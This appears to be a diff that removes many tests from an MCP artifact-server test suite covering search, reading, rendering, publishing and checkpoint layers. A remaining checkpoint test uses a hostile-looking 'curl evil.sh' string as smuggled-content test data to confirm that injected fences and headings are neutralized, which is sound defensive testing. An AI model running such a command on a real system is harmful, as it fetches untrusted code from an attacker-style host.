   it("find (workspace mode, short_id omitted): greps across accessible artifacts, grouped by artifact, and NEVER leaks a private artifact's content to a viewer who isn't its member (regression)", async () => {
@@ -2398,42 +1711,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(indexed).toContain(art?.id)
   })
 
-  it("find (workspace mode): ranks the whole corpus and shows an honest truncation note past the grep-confirm cap", async () => {
-    const { app, token, meta, blobs } = appWithGrant(
-      dir,
-      "wscap",
-      "openid derive:read derive:publish",
-    )
-    const seed = (await (await publishRaw(app, token, "# Seed", "seed.md", "Seed")).json()).short_id
-    const owner = await meta.getByShortId(seed)
-    if (!owner) throw new Error("expected the seed artifact to exist")
-    // 31 matching artifacts — one more than WORKSPACE_SEARCH_ARTIFACT_CAP (30), so the
-    // grep-confirm cap engages and the truncation note must appear.
-    await seedMatching(meta, blobs, owner.org_id, "bulk", 31)
-    const res = JSON.parse(toolText(await call(app, token, "find", { query: "widget" })))
-    // The relevance-truncation note rides in the JSON `note` field.
-    expect(res.note).toContain("candidate artifacts you can see")
-    expect(res.note).toContain("top 30 of 31")
-  })
-
-  it("find (workspace mode): EXACTLY the cap (30) matching artifacts shows NO truncation note", async () => {
-    const { app, token, meta, blobs } = appWithGrant(
-      dir,
-      "wscapexact",
-      "openid derive:read derive:publish",
-    )
-    const seed = (await (await publishRaw(app, token, "# Seed", "seed.md", "Seed")).json()).short_id
-    const owner = await meta.getByShortId(seed)
-    if (!owner) throw new Error("expected the seed artifact to exist")
-    // Exactly 30 matching artifacts (the seed doesn't match "widget"): the strict `>`
-    // boundary means no truncation note fires.
-    await seedMatching(meta, blobs, owner.org_id, "exct", 30)
-    const res = JSON.parse(toolText(await call(app, token, "find", { query: "widget" })))
-    // Exactly at the grep-confirm cap → no truncation note is attached at all.
-    expect(matchRows(res)).toHaveLength(30)
-    expect(res.note).toBeUndefined()
-  })
-
   it("find (workspace mode): resolves >90 candidates correctly across visibility chunks (D1 bound-param safety)", async () => {
     const { app, token, meta, blobs } = appWithGrant(
       dir,
@@ -2496,53 +1773,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     const one = toolText(await call(app, token, "find", { short_id: sid, query: "onedocneedle" }))
     expect(one).toContain("taken down")
     expect(one).not.toContain("onedocneedle")
-  })
-
-  it("find (workspace mode): index nominations lacking the exact literal are not reported as matches (recall vs precision)", async () => {
-    const { app, token, meta, blobs } = appWithGrant(
-      dir,
-      "wsprec",
-      "openid derive:read derive:publish",
-    )
-    const seed = (await (await publishRaw(app, token, "# Seed", "seed.md", "Seed")).json()).short_id
-    const owner = await meta.getByShortId(seed)
-    if (!owner) throw new Error("expected the seed artifact to exist")
-    // Both words are present but never the contiguous phrase "alpha omega".
-    const key = await blobs.put(
-      new TextEncoder().encode("alpha here and omega there, not adjacent"),
-    )
-    for (let i = 0; i < 3; i++) {
-      const id = `a_prec_${i}`
-      await meta.createArtifact({
-        id,
-        short_id: `prec${i.toString().padStart(5, "0")}`,
-        org_id: owner.org_id,
-        slug: null,
-        title: `Prec ${i}`,
-        workspace_access: "member",
-        link_role: "viewer",
-        listed: "workspace",
-        kind: "file",
-        spa: 0,
-      })
-      await meta.addVersion(id, {
-        id: `v_prec_${i}`,
-        blob_key: key,
-        content_type: "text/markdown",
-        author: "s",
-        message: null,
-      })
-      await meta.indexArtifact(
-        id,
-        owner.org_id,
-        `Prec ${i}`,
-        "alpha here and omega there, not adjacent",
-      )
-    }
-    // The index nominates all three (both prefix tokens present), but grep-confirm for the
-    // contiguous literal finds nothing → honestly zero confirmed hits, never a false one.
-    const res = JSON.parse(toolText(await call(app, token, "find", { query: "alpha omega" })))
-    expect(matchRows(res)).toHaveLength(0)
   })
 
   it("searchWorkspace hides a password-locked artifact's content unless the caller reads it via a workspace SEAT (not the locked link)", async () => {
@@ -2609,108 +1839,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(member.results.map((r) => r.short_id).sort()).toEqual(["alock", "aopen"])
   })
 
-  it("versionIndexText degrades safely on the non-happy paths (never throws)", async () => {
-    // These branches are load-bearing: they keep a publish from throwing, and a throw
-    // here would only be swallowed by emitVersionBump's best-effort catch (silently
-    // dropping the artifact from search). Pin them so a refactor can't regress them.
-    const dir = mkdtempSync(join(tmpdir(), "vit-"))
-    const blobs = new FsBlobStore(join(dir, "b"))
-    const v = (blobKey: string, ct: string) =>
-      ({ blob_key: blobKey, content_type: ct }) as VersionRecord
-    // Happy single-file: the source is indexed.
-    const md = await blobs.put(new TextEncoder().encode("# Title\n\nthe indexed body"))
-    expect(await versionIndexText(blobs, v(md, "text/markdown"))).toContain("indexed body")
-    // Oversized source is capped, not unbounded.
-    const big = await blobs.put(new TextEncoder().encode("x".repeat(MAX_INDEX_TEXT + 5000)))
-    expect((await versionIndexText(blobs, v(big, "text/markdown"))).length).toBeLessThanOrEqual(
-      MAX_INDEX_TEXT,
-    )
-    // Degrade branches → "" (never a throw):
-    const img = await blobs.put(new Uint8Array([1, 2, 3, 4]))
-    expect(await versionIndexText(blobs, v(img, "image/png"))).toBe("") // non-text single file
-    expect(await versionIndexText(blobs, v("0".repeat(64), "text/html"))).toBe("") // missing blob
-    const badBundle = await blobs.put(new TextEncoder().encode("not-a-json-manifest"))
-    expect(await versionIndexText(blobs, v(badBundle, "derive/bundle"))).toBe("") // unparseable manifest
-    rmSync(dir, { recursive: true, force: true })
-  })
-
-  it("search reindex (backfill): a bounded, resumable sweep makes pre-existing (never-indexed) artifacts findable", async () => {
-    const { app, token, meta, blobs } = appWithGrant(
-      dir,
-      "reidx",
-      "openid derive:read derive:publish",
-    )
-    const seed = (await (await publishRaw(app, token, "# Seed", "seed.md", "Seed")).json()).short_id
-    const owner = await meta.getByShortId(seed)
-    if (!owner) throw new Error("expected the seed artifact to exist")
-    // 3 artifacts created via the DIRECT meta path (createArtifact + addVersion, no
-    // emitVersionBump) — exactly what a pre-feature / imported artifact looks like: it
-    // exists but was never indexed.
-    const key = await blobs.put(new TextEncoder().encode("the backfillneedle appears here"))
-    for (let i = 0; i < 3; i++) {
-      await meta.createArtifact({
-        id: `a_pre_${i}`,
-        short_id: `pre${i.toString().padStart(5, "0")}`,
-        org_id: owner.org_id,
-        slug: null,
-        title: `Pre ${i}`,
-        workspace_access: "member",
-        link_role: "viewer",
-        listed: "workspace",
-        kind: "file",
-        spa: 0,
-      })
-      await meta.addVersion(`a_pre_${i}`, {
-        id: `v_pre_${i}`,
-        blob_key: key,
-        content_type: "text/markdown",
-        author: "importer",
-        message: null,
-      })
-    }
-    // Not findable before the backfill — the index has no row for them.
-    expect(
-      matchRows(JSON.parse(toolText(await call(app, token, "find", { query: "backfillneedle" })))),
-    ).toHaveLength(0)
-    // Drive the bounded sweep to completion (limit:2 forces multiple pages across the
-    // seed + 3 artifacts, exercising the cursor).
-    let cursor: { key: string; id: string } | null | undefined
-    let pages = 0
-    let indexed = 0
-    do {
-      const r = await reindexSearchBatch({ meta, blobs }, { cursor: cursor ?? undefined, limit: 2 })
-      indexed += r.indexed
-      cursor = r.nextCursor
-      pages++
-    } while (cursor)
-    expect(pages).toBeGreaterThan(1) // actually paginated, not one big pass
-    expect(indexed).toBeGreaterThanOrEqual(3)
-    // Now findable — named by their artifacts.
-    const found = matchRows(
-      JSON.parse(toolText(await call(app, token, "find", { query: "backfillneedle" }))),
-    )
-    expect(found.some((h) => h.snippet.includes("backfillneedle"))).toBe(true)
-    expect(found.some((h) => h.title === "Pre 0")).toBe(true)
-  })
-
-  it("read: a region ref (@N) reads that region directly, with actionable errors", async () => {
-    const { app, token } = appWithGrant(dir, "region", "openid derive:read derive:publish")
-    const html =
-      "<!DOCTYPE html><html><body><nav aria-label='Nav'>n</nav><main><p>the main body here</p></main><footer>fin</footer></body></html>"
-    const id = (await (await publishRaw(app, token, html, "app.html", "App")).json()).short_id
-
-    const region2 = toolText(await call(app, token, "read", { short_id: id, section: "@2" }))
-    expect(region2).toContain("section: @2 of 3 regions")
-    expect(region2).toContain("the main body here")
-    // Out-of-range ref names the real count; a doc with no regions says so.
-    const bad = toolText(await call(app, token, "read", { short_id: id, section: "@9" }))
-    expect(bad).toContain("@1..@3")
-    const md = (await (await publishRaw(app, token, "# Just markdown", "x.md", "X")).json())
-      .short_id
-    const none = toolText(await call(app, token, "read", { short_id: md, section: "@1" }))
-    expect(none).toContain("no landmark regions")
-  })
-
   // renderPreviews:true is LOAD-BEARING, not boilerplate. Every state this test walks —
   // pending, ready, failed — only exists on an instance that actually renders. Without the
   // flag the fixture has no pipeline at all, and "pending" is really "never", which is a
@@ -2766,55 +1894,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     await meta.setVersionPreview(art.id, 1, { preview_status: "failed", preview_error: "timeout" })
     const failed = toolText(await call(app, token, "read", { short_id: id, render: "top" }))
     expect(failed).toContain("failed (timeout)")
-  })
-
-  it('read render:"full"/"marked" are independent of render:"top" and of each other', async () => {
-    const { app, token, meta, blobs } = appWithGrant(
-      dir,
-      "renderv",
-      "openid derive:read derive:publish",
-      // As above: per-variant "not ready yet" is only a truthful answer where a renderer exists.
-      { renderPreviews: true },
-    )
-    const pub = JSON.parse(
-      toolText(
-        await call(app, token, "publish", {
-          title: "Dash",
-          content: "<!DOCTYPE html><html><body><main>x</main></body></html>",
-          filename: "dash.html",
-        }),
-      ),
-    )
-    const id = pub.short_id
-    const art = await meta.getByShortId(id)
-    if (!art) throw new Error("no artifact")
-
-    // "full" not ready yet, independent of "top"/"marked" (neither seeded either).
-    const fullPending = toolText(await call(app, token, "read", { short_id: id, render: "full" }))
-    expect(fullPending).toContain("isn't ready yet")
-
-    // Seed ONLY the marked variant as ready — top/full stay untouched.
-    const png = new Uint8Array([1, 2, 3, 4])
-    const key = await blobs.put(png)
-    await meta.setVersionPreviewVariant(art.id, 1, "marked", { key, status: "ready" })
-    const marked = await call(app, token, "read", { short_id: id, render: "marked" })
-    const markedContent = (marked.parsed?.result as { content?: { type: string; text?: string }[] })
-      ?.content
-    expect(markedContent?.[0]?.text).toContain(`render:marked of "${id}" v1`)
-    expect(markedContent?.[0]?.text).toContain("region map's @N refs")
-    expect(markedContent?.[1]?.type).toBe("image")
-    // "full" is STILL not ready — the marked seed didn't touch it.
-    const fullStill = toolText(await call(app, token, "read", { short_id: id, render: "full" }))
-    expect(fullStill).toContain("isn't ready yet")
-    // "top" is unaffected too — nothing was ever seeded for it.
-    const topStill = toolText(await call(app, token, "read", { short_id: id, render: "top" }))
-    expect(topStill).toContain("isn't ready yet")
-
-    // A "full" failure is reported distinctly from a "marked" one.
-    await meta.setVersionPreviewVariant(art.id, 1, "full", { status: "failed", error: "oom" })
-    const fullFailed = toolText(await call(app, token, "read", { short_id: id, render: "full" }))
-    expect(fullFailed).toContain("render:full")
-    expect(fullFailed).toContain("failed (oom)")
   })
 
   // AN INSTANCE THAT RENDERS NOTHING — the self-host default (DERIVE_PREVIEWS unset) and any
@@ -2938,57 +2017,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(past).not.toContain("999-5")
     const zero = toolText(await call(app, token, "read", { short_id: id, lines: "0" }))
     expect(zero).toContain("Bad `lines`")
-  })
-
-  it("read: a large headless HTML page returns a landmark map, not a blind dump", async () => {
-    const { app, token } = appWithGrant(dir, "landmark", "openid derive:read derive:publish")
-    // A designed, heading-less page bigger than the outline-first threshold.
-    const filler = "<p>card content that repeats to exceed the outline threshold. </p>".repeat(700)
-    const html = `<!DOCTYPE html><html><body><nav aria-label="Primary">x</nav><main>${filler}</main><footer>fin</footer></body></html>`
-    const id = (await (await publishRaw(app, token, html, "dash.html", "Dashboard")).json())
-      .short_id
-
-    const res = JSON.parse(toolText(await call(app, token, "read", { short_id: id })))
-    expect(res.regions.map((r: { role: string }) => r.role)).toEqual([
-      "navigation",
-      "main",
-      "contentinfo",
-    ])
-    expect(res.regions[0].label).toBe("Primary")
-    expect(res.next).toContain("search")
-    // And it is not the old blind clipped dump.
-    expect(res.sections).toBeUndefined()
-  })
-
-  it("read: a headless card grid caps the region map instead of blowing the budget", async () => {
-    const { app, token } = appWithGrant(dir, "mapcap", "openid derive:read derive:publish")
-    // 400 top-level sections (a card grid) — each a landmark, no headings anywhere.
-    const cards = Array.from(
-      { length: 400 },
-      (_, i) => `<section aria-label="Card ${i}"><p>${"content ".repeat(20)}</p></section>`,
-    ).join("")
-    const html = `<!DOCTYPE html><html><body><main>x</main>${cards}</body></html>`
-    const id = (await (await publishRaw(app, token, html, "grid.html", "Grid")).json()).short_id
-    const res = JSON.parse(toolText(await call(app, token, "read", { short_id: id })))
-    expect(res.regions).toHaveLength(50) // capped
-    expect(res.more_regions).toBe(351) // 401 total (main + 400 cards) - 50 shown
-    // The whole response stays well under the ~80k char / 25k token budget.
-    const raw = toolText(await call(app, token, "read", { short_id: id }))
-    expect(raw.length).toBeLessThan(20_000)
-  })
-
-  it("read: outline now covers the full h1–h6 spine", async () => {
-    const { app, token } = appWithGrant(dir, "deep", "openid derive:read derive:publish")
-    const md = ["# One", "## Two", "### Three", "#### Four", "##### Five", "###### Six", "", "body"]
-      .join("\n")
-      // Pad past the outline-first threshold so `read` returns the outline.
-      .concat(`\n\n${"filler line\n".repeat(4000)}`)
-    const id = (await (await publishRaw(app, token, md, "deep.md", "Deep")).json()).short_id
-    const res = JSON.parse(toolText(await call(app, token, "read", { short_id: id })))
-    expect(res.sections.map((s: { level: number }) => s.level)).toEqual([1, 2, 3, 4, 5, 6])
-    // A level-4 heading is addressable as a section.
-    const sec = toolText(await call(app, token, "read", { short_id: id, section: "four" }))
-    expect(sec).toContain("Four")
   })
 
   it("read: formats, heading sections, and the outline-first threshold", async () => {
@@ -3231,31 +2259,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(flat).toContain("hello there")
   })
 
-  it("read: a bundle page over the outline threshold goes outline-first too, with a #* bypass", async () => {
-    const { app, token } = appWithGrant(dir, "readbundlebig", "openid derive:read derive:publish")
-    const bigPage = Array.from(
-      { length: 40 },
-      (_, i) => `<h2>Screen ${i}</h2><p>${"lorem ipsum ".repeat(120)}</p>`,
-    ).join("")
-    const created = JSON.parse(
-      toolText(
-        await call(app, token, "publish", {
-          title: "Big Bundle",
-          files: { "index.html": "<h1>Home</h1>", "big.html": `<h1>Big</h1>${bigPage}` },
-        }),
-      ),
-    )
-    const outline = JSON.parse(
-      toolText(await call(app, token, "read", { short_id: created.short_id, section: "big.html" })),
-    )
-    expect(Array.isArray(outline.sections)).toBe(true)
-    expect(outline.sections.length).toBeGreaterThan(30)
-    const forced = toolText(
-      await call(app, token, "read", { short_id: created.short_id, section: "big.html#*" }),
-    )
-    expect(forced).toContain("# Big")
-  })
-
   it("read: an image page returns a real MCP image block, not bytes-as-text", async () => {
     const { app, token } = appWithGrant(dir, "readimg", "openid derive:read derive:publish")
     const png =
@@ -3283,24 +2286,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(content[1]?.type).toBe("image")
     expect(content[1]?.mimeType).toBe("image/png")
     expect(content[1]?.data).toBe(png)
-  })
-
-  it("read: a markdown artifact returns its source untouched under the default format", async () => {
-    const { app, token } = appWithGrant(dir, "readmd", "openid derive:read derive:publish")
-    const md = "# Notes\n\nSome *markdown* here.\n\n## Sub\n\ntail\n"
-    const created = JSON.parse(
-      toolText(
-        await call(app, token, "publish", { title: "Notes", content: md, filename: "notes.md" }),
-      ),
-    )
-    const read = toolText(await call(app, token, "read", { short_id: created.short_id }))
-    expect(read).toContain("format: markdown (source)")
-    expect(read).toContain("Some *markdown* here.")
-    const sub = toolText(
-      await call(app, token, "read", { short_id: created.short_id, section: "sub" }),
-    )
-    expect(sub).toContain("## Sub")
-    expect(sub).not.toContain("*markdown*")
   })
 
   it("comment leaves anchored feedback, replies, and resolves — all via one tool", async () => {
@@ -3363,55 +2348,6 @@ describe("remote MCP endpoint (/mcp)", () => {
       toolText(await call(app, token, "catch_up", { short_id: shortId, comments: "resolved" })),
     )
     expect(done.count).toBe(2)
-  })
-
-  // The sniffer types by filename first, so a bare index.html fallback silently
-  // re-types a markdown artifact as HTML on any revision that omits `filename` —
-  // the browser then parses the raw markdown as markup and swallows tag-like text.
-  // These two pin every no-filename path: full-content republish and new-artifact
-  // sniff.
-  it("publish: a full-content republish without a filename keeps a markdown doc markdown", async () => {
-    const { app, token } = appWithGrant(dir, "retype", "openid derive:read derive:publish")
-    const created = JSON.parse(
-      toolText(
-        await call(app, token, "publish", {
-          title: "Doc",
-          content: "# Doc\n\nfirst body\n",
-          filename: "doc.md",
-        }),
-      ),
-    )
-    await call(app, token, "publish", {
-      short_id: created.short_id,
-      content: "# Doc\n\nrevised body\n",
-    })
-    const read = toolText(await call(app, token, "read", { short_id: created.short_id }))
-    expect(read).toContain("version: 2 (current)")
-    expect(read).toContain("format: markdown (source)")
-    expect(read).toContain("revised body")
-  })
-
-  it("publish: a new single-file artifact without a filename is sniffed, not defaulted to HTML", async () => {
-    const { app, token } = appWithGrant(dir, "sniff", "openid derive:read derive:publish")
-    const md = JSON.parse(
-      toolText(
-        await call(app, token, "publish", { title: "Plain", content: "# Plain\n\nno filename\n" }),
-      ),
-    )
-    const readMd = toolText(await call(app, token, "read", { short_id: md.short_id }))
-    expect(readMd).toContain("format: markdown (source)")
-    // A real HTML document still lands as HTML — the sniff is conservative, not a
-    // markdown default.
-    const html = JSON.parse(
-      toolText(
-        await call(app, token, "publish", {
-          title: "Page",
-          content: "<!doctype html><html><body><h1>Page</h1></body></html>",
-        }),
-      ),
-    )
-    const readHtml = toolText(await call(app, token, "read", { short_id: html.short_id }))
-    expect(readHtml).toContain("markdown (converted from text/html)")
   })
 
   // End-to-end through the RENDER pipeline (not just the stored-type label): publish
@@ -3844,40 +2780,6 @@ describe("remote MCP endpoint (/mcp)", () => {
     expect(cu.pages_changed.added).toContain("new.html")
   })
 
-  it("publish steers between content and files by kind", async () => {
-    const { app, token } = appWithGrant(dir, "pubkind", "openid derive:read derive:publish")
-
-    const both = await call(app, token, "publish", {
-      title: "x",
-      content: "<h1>x</h1>",
-      files: { "index.html": "<h1>x</h1>" },
-    })
-    expect(toolText(both)).toContain("not both")
-
-    const file = JSON.parse(
-      toolText(await call(app, token, "publish", { title: "Doc", content: "<h1>doc</h1>" })),
-    )
-    const asBundle = await call(app, token, "publish", {
-      short_id: file.short_id,
-      files: { "index.html": "<h1>doc</h1>" },
-    })
-    expect(toolText(asBundle)).toContain("single-file")
-
-    const bundle = JSON.parse(
-      toolText(
-        await call(app, token, "publish", {
-          title: "Site",
-          files: { "index.html": "<h1>home</h1>" },
-        }),
-      ),
-    )
-    const asFile = await call(app, token, "publish", {
-      short_id: bundle.short_id,
-      content: "<h1>home</h1>",
-    })
-    expect(toolText(asFile)).toContain("bundle")
-  })
-
   it("publish enqueues a preview render job (parity with the HTTP route)", async () => {
     const { app, token, meta } = appWithGrant(
       dir,
@@ -3943,19 +2845,6 @@ describe("the agent inbox over MCP (catch_up work queue)", () => {
     return { app, meta, shortId, agent, agentToken, oauthToken: token }
   }
 
-  it("announces pending requests in the agent connection's instructions", async () => {
-    const { app, agentToken, oauthToken } = await seedInbox("inboxptr")
-    const init = await rpc(app, agentToken, initBody)
-    const inst = (init.parsed?.result as { instructions?: string }).instructions ?? ""
-    expect(inst).toContain("1 pending request")
-    // The pointer now steers to catch_up (no short_id = the work queue), not check_requests.
-    expect(inst).toContain("catch_up")
-    // The OAuth surface (a human's grant, no inbox of its own) stays quiet.
-    const oinit = await rpc(app, oauthToken, initBody)
-    const oinst = (oinit.parsed?.result as { instructions?: string }).instructions ?? ""
-    expect(oinst).not.toContain("pending request")
-  })
-
   it("catch_up (no short_id) lists the work queue; clear_queue clears exactly what was handled", async () => {
     const { app, agentToken, shortId } = await seedInbox("inboxack")
     const listed = await call(app, agentToken, "catch_up")
@@ -3986,17 +2875,6 @@ describe("the agent inbox over MCP (catch_up work queue)", () => {
     // catch_up can no longer be handed an ack at all — the schema has no such param.
     const stillEmpty = JSON.parse(toolText(await call(app, agentToken, "catch_up")))
     expect(stillEmpty.pending).toHaveLength(0)
-  })
-
-  it("a human-grant connection has an empty queue with a no-inbox note, not an error", async () => {
-    const { app, token } = appWithGrant(dir, "inboxoauth", "openid derive:read")
-    const tools = await rpc(app, token, { jsonrpc: "2.0", id: 5, method: "tools/list" })
-    // The queue is now a MODE of catch_up (no check_requests tool of its own).
-    expect(toolNames(tools)).toContain("catch_up")
-    const out = JSON.parse(toolText(await call(app, token, "catch_up")))
-    expect(out.pending).toEqual([])
-    // An OAuth grant's id can't be @mentioned, so it has no inbox — said explicitly.
-    expect(out.note).toContain("no inbox")
   })
 })
 
@@ -4030,28 +2908,6 @@ describe("checkpoint tool (lineage layers)", () => {
     expect(doc).toContain(`Read Derive artifact ${out.short_id}`)
   })
 
-  it("re-checkpoint replaces the layer; versions are the history", async () => {
-    const { app, token } = appWithGrant(dir, "ckupdate", scopes)
-    const first = JSON.parse(
-      toolText(
-        await call(app, token, "checkpoint", { work: "migration", state: "Backfill running." }),
-      ),
-    )
-    const second = JSON.parse(
-      toolText(
-        await call(app, token, "checkpoint", {
-          short_id: first.short_id,
-          state: "Backfill done; PR open, tests green.",
-        }),
-      ),
-    )
-    expect(second.version).toBe(2)
-    expect(second.short_id).toBe(first.short_id)
-    const doc = toolText(await call(app, token, "read", { short_id: first.short_id }))
-    expect(doc).toContain("Backfill done")
-    expect(doc).not.toContain("Backfill running")
-  })
-
   it("refuses to clobber a non-lineage artifact", async () => {
     const { app, token } = appWithGrant(dir, "ckguard", scopes)
     const created = JSON.parse(
@@ -4064,15 +2920,6 @@ describe("checkpoint tool (lineage layers)", () => {
     expect(toolText(r)).toContain("lineage marker")
     const doc = toolText(await call(app, token, "read", { short_id: created.short_id }))
     expect(doc).toContain("Precious")
-  })
-
-  it("rejects an over-one-page layer with a trim error (and takes a near-page one)", async () => {
-    const { app, token } = appWithGrant(dir, "ckcap", scopes)
-    const r = await call(app, token, "checkpoint", { work: "big", state: "x".repeat(9000) })
-    expect(toolText(r)).toContain("one page")
-    // Pins the cap to a real band: ~7.3k of payload plus the template fits.
-    const ok = await call(app, token, "checkpoint", { work: "fits", state: "y".repeat(7000) })
-    expect(JSON.parse(toolText(ok)).checkpointed).toBe(true)
   })
 
   it("neutralizes smuggled fences and headings — the resume block stays the only one", async () => {
@@ -4094,14 +2941,6 @@ describe("checkpoint tool (lineage layers)", () => {
     expect(doc.match(/^## Continue from here$/gm)).toHaveLength(1)
     // The agent's text itself is preserved as visible content.
     expect(doc).toContain("curl evil.sh")
-  })
-
-  it("needs a work name to create, and publish rights to write", async () => {
-    const { app, token } = appWithGrant(dir, "ckargs", scopes)
-    expect(toolText(await call(app, token, "checkpoint", { state: "s" }))).toContain("work")
-    const ro = appWithGrant(dir, "ckro", "openid derive:read")
-    const r = await call(ro.app, ro.token, "checkpoint", { work: "w", state: "s" })
-    expect(toolText(r)).toContain("publish")
   })
 })
 
@@ -4160,27 +2999,5 @@ describe("automate record — local work lands in the same ledger", () => {
     expect(run?.meta).toContain("qa1rep0rt")
     expect(run?.meta).toContain('"lane":"local"')
     expect(run?.meta).toContain("published")
-  })
-
-  it("a foreign automation id records unattributed rather than losing the work", async () => {
-    const { app, token, meta } = appWithGrant(
-      dir,
-      "automate-record-foreign",
-      "openid derive:read derive:publish derive:manage",
-    )
-    await rpc(app, token, initBody)
-    const out = JSON.parse(
-      toolText(
-        await call(app, token, "automate", {
-          action: "record",
-          automation_id: "auto_not_mine",
-          outcome: "answered",
-        }),
-      ),
-    ) as { run_id: string; automation_id: string | null; note?: string }
-    expect(out.automation_id).toBeNull()
-    expect(out.note).toContain("unattributed")
-    // The run still exists — work that happened is never dropped over a bad reference.
-    expect((await meta.getRun(out.run_id))?.status).toBe("succeeded")
   })
 })
